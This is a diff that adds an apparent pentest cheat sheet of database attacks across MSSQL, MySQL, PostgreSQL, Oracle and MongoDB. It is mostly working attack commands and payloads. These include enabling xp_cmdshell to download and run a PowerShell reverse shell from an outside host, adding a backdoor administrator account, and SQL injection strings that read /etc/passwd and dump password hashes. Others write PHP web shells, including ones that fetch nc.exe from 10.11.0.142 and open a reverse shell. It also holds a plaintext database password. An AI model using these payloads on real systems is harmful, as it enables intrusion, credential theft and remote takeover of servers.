@@ -1,0 +1,182 @@
+##sqsh
+
+
+sqsh -S 10.11.1.31 -U su -P "ew971429121"
+
+To allow advanced options to be changed.  
+EXEC sp_configure 'show advanced options', 1;  
+GO  
+-- To update the currently configured value for advanced options.  
+RECONFIGURE;  
+GO  
+-- To enable the feature.  
+EXEC sp_configure 'xp_cmdshell', 1;  
+GO  
+-- To update the currently configured value for this feature.  
+RECONFIGURE;  
+GO
+
+
+###reverse shell via cmdshell
+
+EXEC xp_cmdshell 'whoami'
+
+EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.119.144:8000/invoke_reverse_shell.ps1") | powershell -noprofile'
+
+nc -nlvp 80
+
+\go
+
+###nmap xp_cmdshell backdoors
+https://pentestwiki.org/sql-injection/
+
+#Execute system commands using xp_cmdshell:
+
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="whoami" $IP
+
+##Planting a backdoor account using xp_cmdshell:
+
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user jack $PASSWORD /add" $IP
+
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net localgroup Administrators jack /add" $IP
+
+##xp_cmdshell queries for Code Execution:
+
+xp_cmdshell 'whoami.exe'
+xp..cmdshell 'dir c:\'
+exec xp_cmdshell 'whoami.exe'
+exec master.dbo.xp_cmdshell 'osql -E -Sserver1 -i c:\temp\nightly.sql'
+EXEC master..xp_cmdshell 'dir *.exe'
+xp_cmdshell 'dir *.exe';  
+DECLARE @cmd sysname, @var sysname;  
+SET @var = 'Hello world';  
+SET @cmd = 'echo ' + @var + ' &gt; var_out.txt';  
+EXEC master..xp_cmdshell @cmd; 
+
+##MS SQL Queries
+
+SELECT name FROM sysusers WHERE name = USER_NAME();
+SELECT HOST_NAME(), USER_NAME(), SYSTEM_USER, @@VERSION, @@SERVERNAME, @@LANGUAGE
+SELECT DB_NAME()
+Execute spFileDetails 'c:\autoexec.bat'
+Select dbo.ufsReadfileAsString ('MyPath','MyFileName')
+EXEC xp_cmdshell 'dir *.exe'
+SELECT xp_msver ProductVersion, xp_msver WindowsVersion
+SELECT CURRENT_USER
+SELECT WAIT_FOR(20)
+
+
+##SQL payloads to validate SQL injections:
+
+345 order by 7
+en' order by 7 -- 
+345 and sleep(5)
+en/**/and/**/sleep(5)
+en'/**/and/**/sleep(5)-- 
+SQL payloads for SQL injection (information gathering):
+
+##SQL payloads for SQL injection (information gathering):
+
+734 union all select 1,@@version,3,4,table_name,6 from information_schema.tables
+734 union all select 1,@@version,3,4,column_name,6 from information_schema.columns where table_name="users"
+734 union select 1,2,3,4,concat(Host, " / ", User," / ", Password),6 from mysql.user
+
+##SQL payloads to read/write OS files and remote code execution:
+
+734 union all select 1,2,3,4,5,load_file('/etc/passwd') 
+734 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']); ?>",6 into outfile 'c:/xampp/htdocs/backdoor.php'
+734 union all select 1,2,3,4,"<?php $filename='C:/xampp/htdocs/nc.exe'; $download='http://10.11.0.142/nc.exe'; file_put_contents($filename,file_get_contents($download)); system('C:/xampp/htdocs/nc.exe -e cmd.exe 10.11.0.142 443'); ?>",6 into outfile 'c:/xampp/htdocs/backdoor3.php'
+en' union select 1,2,3,4,"<?php $filename='nc.exe'; $download='http://10.11.0.142/nc.exe'; file_put_contents($filename,file_get_contents($download)); system('nc.exe -e cmd.exe 10.11.0.142 443'); ?>",6 into outfile 'c:/xampp/htdocs/backdoor-post.php' -- 
+
+Remember:
+
+SHOW DATABASES = SHOW SCHEMAS = SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
+
+
+
+##PostgreSQL payloads
+
+
+SELECT version()
+SELECT usename FROM pg_catalog.pg_user
+SELECT pg_read_file(current_setting('data_directory') || '/postmaster.pid');
+SELECT pg_read_file('/etc/passwd')
+SELECT * FROM pg_catalog.pg_tables
+SELECT current_user
+select usesysid from pg_user where usename = CURRENT_USER
+SELECT * FROM pg_catalog.pg_user WHERE usename = current_user
+ALTER USER postgres WITH ENCRYPTED PASSWORD 'password'
+ALTER USER user WITH SUPERUSER
+SELECT current_setting('is_superuser')
+SELECT inet_server_addr()
+\i /etc/passwd
+\s /tmp/webshell.php
+
+# For RCE:
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+
+
+##Oracle Exploitation
+
+Testing connection:
+
+cat $ORACLE_HOME/network/admin/tnsnames.ora
+cat $TNSADMIN
+
+Connecting into the database:
+
+##Syntax:
+
+/usr/lib/oracle/12.2/client64/bin/sqlplus $USERNAME/$PASSWORD@$HOSTNAME/$SERVICE_NAME 
+sqlplus sys/$PASSWORD@//localhost:1521/$SID as sysdba
+sqlplus system/$PASSWORD@//localhost:1521/$SID
+
+
+##SQL Queries for Oracle Database:
+
+
+SELECT NAME, FILE#, STATUS, CHECKPOINT_CHANGE# "CHECKPOINT" FROM V$DATAFILE
+SELECT sysdate FROM dual
+SELECT * FROM PRODUCT_COMPONENT_VERSION; # Show versions
+SELECT table_name FROM all_tables; # Show tables
+SELECT owner, table_name FROM all_tables;
+SELECT user FROM dual; # Show current user
+SELECT * from $TABLE FETCH FIRST 10 ROWS ONLY; # LIMIT 10
+SELECT DISTINCT OWNER FROM ALL_OBJECTS; # Show users
+SELECT TABLESPACE_NAME FROM USER_TABLESPACES; # List tablespaces
+
+# Use the following SQL to find the entire list of objects you have access to
+select * from all_tab_privs;
+
+SELECT USERNAME,PASSWORD_VERSIONS FROM SYS.DBA_USERS;
+
+
+
+##Connection checker (when no sqlplus):
+
+https://github.com/aimtiaz11/oracle-jdbc-tester
+
+Oracle TNS Poison vulnerability
+Download Nmap NSE script:
+https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse
+
+nmap --script=oracle-tns-poison -p 1521 $IP
+References:
+
+http://www.orafaq.com/wiki/Tnsnames.ora
+https://docs.oracle.com/cd/E11882_01/network.112/e41945/connect.htm#NETAG378
+Tools:
+
+http://plsqlexecoscomm.sourceforge.net/
+https://github.com/quentinhardy/odat
+
+
+
+##MongoDB Exploitation
+
+nmap --script=mongodb-brute $IP
+nmap --script=mongodb-databases $IP
+mongo --port $PORT -u $USER -p $PASS $IP
+nosqlmap $IP
